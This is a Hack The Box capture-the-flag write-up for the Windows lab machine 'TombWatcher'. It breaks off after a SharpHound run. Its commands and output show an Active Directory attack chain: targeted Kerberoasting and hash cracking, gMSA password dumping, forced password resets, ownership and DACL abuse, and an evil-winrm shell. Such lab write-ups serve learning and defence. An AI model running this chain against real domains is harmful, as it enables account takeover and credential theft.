---
title: TombWatcher [Medium]
date: 2025-06-09
tags: [htb, windows, nmap, smbmap, dirsearch, kerberoasting, password cracking, bloodhound, AD, owneredit, dacledit, certipy, clock skew, evil-winrm, ESC15, CVE-2024-49019]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/tombwatcher-htb-season8
image: /assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_banner.png
---

# TombWatcher HTB Season 8
## Machine information
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry` / `H3nry_987TGV!` <br>
Author: [mrb3n8132](https://app.hackthebox.com/users/2984) and [Sentinal](https://app.hackthebox.com/users/206770)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 23:43 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.028s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 07:44:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-08T07:45:23+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-08T07:45:24+00:00; +4h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-08T07:45:23+00:00; +4h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-08T07:45:23+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-08T07:44:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.21 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     tombwatcher.htb DC01.tombwatcher.htb
```

This challenge got port 80 open, let's go through and enumerate it.

### Web Enumeration
Go to `http://tombwatcher.htb`.

![Web Page](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_web_page.png)

Just Internet Information Services (IIS) running on port 80.

```bash
└─$ dirsearch -u http://tombwatcher.htb/      
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/DEPTHS_Season8/TombWatcher/reports/http_tombwatcher.htb/__25-06-07_23-56-00.txt

Target: http://tombwatcher.htb/

[23:56:00] Starting: 
[23:56:00] 403 -  312B  - /%2e%2e//google.com                               
[23:56:00] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[23:56:01] 404 -    2KB - /.ashx                                            
[23:56:01] 404 -    2KB - /.asmx
[23:56:07] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[23:56:10] 404 -    2KB - /admin%20/                                        
[23:56:10] 404 -    2KB - /admin.                                           
[23:56:21] 301 -  160B  - /aspnet_client  ->  http://tombwatcher.htb/aspnet_client/
[23:56:21] 403 -    1KB - /aspnet_client/                                   
[23:56:21] 404 -    2KB - /asset..
[23:56:25] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[23:56:34] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[23:56:41] 404 -    2KB - /index.php.                                       
[23:56:42] 404 -    2KB - /javax.faces.resource.../                         
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[23:56:42] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[23:56:42] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[23:56:42] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[23:56:42] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[23:56:42] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage    
[23:56:42] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
[23:56:44] 404 -    2KB - /login.wdm%2e                                     
[23:56:46] 404 -    2KB - /mcx/mcxservice.svc                               
[23:56:58] 404 -    2KB - /rating_over.                                     
[23:56:58] 404 -    2KB - /reach/sip.svc                                    
[23:57:01] 404 -    2KB - /service.asmx                                     
[23:57:06] 404 -    2KB - /static..                                         
[23:57:10] 403 -    2KB - /Trace.axd                                        
[23:57:10] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx          
[23:57:14] 404 -    2KB - /WEB-INF./                                        
[23:57:16] 404 -    2KB - /WebResource.axd?d=LER8t9aS                       
[23:57:16] 404 -    2KB - /webticket/webticketservice.svc                   
                                                                             
Task Completed
```

Seem like nothing interesting, let's try to enumrate the user `henry`.

### User Enumeration
```bash
└─$ sudo crackmapexec smb 10.129.xx.xx -u henry -p H3nry_987TGV! --users            
SMB         10.129.xx.xx     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.129.xx.xx     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.xx.xx     445    DC01             [+] Enumerated domain user(s)
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\john                           badpwdcount: 0 desc: 
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\sam                            badpwdcount: 0 desc: 
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Alfred                         badpwdcount: 0 desc: 
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Henry                          badpwdcount: 0 desc: 
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

```bash
└─$ cat users.txt       
Administrator
Guest
krbtgt
DC01$
Henry
Alfred
sam
john
ansible_dev$
```

### SMB
```bash
└─$ smbmap -H tombwatcher.htb -u henry -p H3nry_987TGV!                                                                                         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.xx.xx:445 Name: tombwatcher.htb           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

Nothing special with SMB, let's move to bloodhound.

### Bloodhound
```bash
└─$ bloodhound-python -u henry -p H3nry_987TGV! -d tombwatcher.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 07S
```

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound.png)

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_2.png)

Got a very graph path from start node `henry` to leverage to other nodes.

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_3.png)

Found out that `henry@tombwatcher.htb` has **WriteSPN** over `alfred@tombwatcher.htb`

### Kerberoasting & Cracking
We gonna use this concept from [The Hacker Recipes - Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting) to get the password of `alfred@tombwatcher.htb`. <br>
You can get the tool from [this](https://github.com/ShutdownRepo/targetedKerberoast) repo.
```bash
└─$ ./targetedKerberoast.py -v -d "tombwatcher.htb" -u "henry" -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e61f18455c53963ec27884741c8fcb48$<SNIP>
[VERBOSE] SPN removed successfully for (Alfred)
```

Got the hash of `alfred`, let's crack it.

```bash
└─$ hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

...

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e61f18455c53963ec27884741c8fcb48$<SNIP>:basketxxxx
```

Nailed the password `Alfred:basketxxxx`

Back to bloodhound, we saw this path:

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_4.png)

Saw that we can **AddSelf** to `Infrastructure@tombwatcher.htb` group. Let's get in.

```bash
└─$ bloodyAD --host 10.129.xx.xx -d tombwatcher.htb -u 'Alfred' -p 'basketxxxx' add groupMember 'Infrastructure' Alfred 
[+] Alfred added to Infrastructure
```

Continue the path, found out that:

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_5.png)

The `Infrastructure` group has **ReadGMSAPassword** over `ansible_dev$@tombwatcher.htb`.

### Read gMSA password
Found out this concept from [The Hacker Recipes - Read gMSA password](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword), there are some alternative ways to read gMSA password of `ansible_dev$`. <br>
&rarr; We gonna stick with this one [gMSADumper](https://github.com/micahvandeusen/gMSADumper).

```bash
└─$ ./gMSADumper.py -u 'Alfred' -p 'basketxxxx' -d tombwatcher.htb                                                    
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::<SNIP>
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a
```

Got the password of `ansible_dev$`:`<SNIP>`. What's next?

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_6.png)

So `ansible_dev$` has **ForceChangePassword** over `sam@tombwatcher.htb`.

### ForceChangePassword
Let's change the password of `sam` to our own.
```bash
└─$ bloodyAD -u 'ansible_dev$' -p ':<SNIP>' -d tombwatcher.htb --dc-ip 10.129.xx.xx set password sam 'P4ssword@123'
[+] Password changed successfully!
```

```powershell
└─$ evil-winrm -i tombwatcher.htb -u "sam" -p 'P4ssword@123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Can not login with the new password. Let's continue with the path.

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_7.png)

Okay, `sam@tombwatcher.htb` has **WriteOwner** over `john@tombwatcher.htb`. <br>
&rarr; Only another concept from [The Hacker Recipes - Grant Ownership](https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership)


### Grant Ownership
You can get the tool from [owneredit.py](https://github.com/fortra/impacket/blob/master/examples/owneredit.py) from [impacket](https://github.com/fortra/impacket).

```bash
└─$ owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'P4ssword@123'
/usr/local/bin/owneredit.py:85: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/local/bin/owneredit.py:94: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/local/bin/owneredit.py:95: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/local/bin/owneredit.py:96: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/local/bin/owneredit.py:98: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/local/bin/owneredit.py:99: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/local/bin/owneredit.py:100: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/local/bin/owneredit.py:101: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/local/bin/owneredit.py:102: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/local/bin/owneredit.py:103: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/local/bin/owneredit.py:104: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/local/bin/owneredit.py:105: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/local/bin/owneredit.py:106: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/local/bin/owneredit.py:107: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/local/bin/owneredit.py:108: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/local/bin/owneredit.py:109: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/local/bin/owneredit.py:110: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/local/bin/owneredit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

This command will take the ownership of `john@tombwatcher.htb` to `sam@tombwatcher.htb`.

```bash
└─$ owneredit.py -action read -target 'john' 'tombwatcher.htb'/'sam':'P4ssword@123'
/usr/local/bin/owneredit.py:85: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/local/bin/owneredit.py:94: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/local/bin/owneredit.py:95: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/local/bin/owneredit.py:96: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/local/bin/owneredit.py:98: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/local/bin/owneredit.py:99: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/local/bin/owneredit.py:100: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/local/bin/owneredit.py:101: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/local/bin/owneredit.py:102: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/local/bin/owneredit.py:103: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/local/bin/owneredit.py:104: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/local/bin/owneredit.py:105: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/local/bin/owneredit.py:106: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/local/bin/owneredit.py:107: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/local/bin/owneredit.py:108: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/local/bin/owneredit.py:109: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/local/bin/owneredit.py:110: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/local/bin/owneredit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] - sAMAccountName: sam
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb
```

For this one, just confirm that current ownership of `john` (should be `sam` now). <br>
Next, we gonna use this [dacledit.py](https://github.com/fortra/impacket/blob/master/examples/dacledit.py) to make `sam` grant full control over `john`.

```bash
└─$ dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'P4ssword@123'
/usr/local/bin/dacledit.py:99: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/local/bin/dacledit.py:108: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/local/bin/dacledit.py:109: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/local/bin/dacledit.py:110: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/local/bin/dacledit.py:112: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/local/bin/dacledit.py:113: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/local/bin/dacledit.py:114: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/local/bin/dacledit.py:115: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/local/bin/dacledit.py:116: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/local/bin/dacledit.py:117: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/local/bin/dacledit.py:118: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/local/bin/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/local/bin/dacledit.py:120: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/local/bin/dacledit.py:121: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/local/bin/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/local/bin/dacledit.py:123: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/local/bin/dacledit.py:124: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/local/bin/dacledit.py:125: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250608-053101.bak
[*] DACL modified successfully!
```

Now we can change the password of `john` to our own.

```bash
└─$ bloodyAD --host tombwatcher.htb -u sam -p 'P4ssword@123' set password john 'P@ssw4rd123'    
[+] Password changed successfully!
```

```powershell
└─$ evil-winrm -i tombwatcher.htb -u "john" -p 'P@ssw4rd123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> dir
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> dir


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/8/2025   3:37 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
4e2610xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Got the `user.txt` flag.

And there is also other way to accomplish this:
```bash
└─$ bloodyAD --host tombwatcher.htb -u sam -p 'P4ssword@123' set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

```bash
└─$ bloodyAD --host tombwatcher.htb -u sam -p 'P4ssword@123' add genericAll john sam
[+] sam has now GenericAll on john

```bash
└─$ bloodyAD --host tombwatcher.htb -u sam -p 'P4ssword@123' set password john 'P@ssw4rd123'
[+] Password changed successfully!
```

## Initial Access
We got into `john` account, let's check the bloodhound and find anything more to escalate.

![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_8.png)

Check the `Node Info` and go for `OutBound Object Control`. Found out that `john@tombwatcher.htb` has **GenericAll** over `ADCS@tombwatcher.htb`.

Damn, stuck here a while. Thinking that our bloodhound is legacy so can not found any more. <br>
&rarr; Maybe let's try the new bloodhound instead from [here](https://github.com/SpecterOps/BloodHound).

The new bloodhound is great with new version on web but I still familiar with the OG one. <br>
Btw, let's upload `SharpHound.exe` to the machine and run it.

You can donwload it from [SharpHound](https://github.com/SpecterOps/SharpHound/releases).

After transfer the file to the machine, run it.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> .\SharpHound.exe -c All -d tombwatcher.htb
2025-06-10T09:11:39.3658358-04:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-06-10T09:11:39.6314507-04:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-10T09:11:39.6785775-04:00|INFORMATION|Initializing SharpHound at 9:11 AM on 6/10/2025
2025-06-10T09:11:39.9283187-04:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-10T09:11:40.1001915-04:00|INFORMATION|Beginning LDAP search for tombwatcher.htb
2025-06-10T09:11:40.2408074-04:00|INFORMATION|Beginning LDAP search for tombwatcher.htb Configuration NC
2025-06-10T09:11:40.2720670-04:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TOMBWATCHER.HTB
2025-06-10T09:11:40.2720670-04:00|INFORMATION|Producer has finished, closing LDAP channel
2025-06-10T09:11:40.2720670-04:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-06-10T09:11:40.3189370-04:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TOMBWATCHER.HTB
2025-06-10T09:11:40.5689307-04:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TOMBWATCHER.HTB
2025-06-10T09:11:40.9595536-04:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TOMBWATCHER.HTB
2025-06-10T09:11:40.9751893-04:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TOMBWATCHER.HTB
2025-06-10T09:11:46.6158298-04:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-06-10T09:11:46.6626837-04:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-06-10T09:11:46.8814352-04:00|INFORMATION|Status: 341 objects finished (+341 56.83333)/s -- Using 41 MB RAM
2025-06-10T09:11:46.8814352-04:00|INFORMATION|Enumeration finished in 00:00:06.8118333
2025-06-10T09:11:47.0220633-04:00|INFORMATION|Saving cache with stats: 22 ID to type mappings.
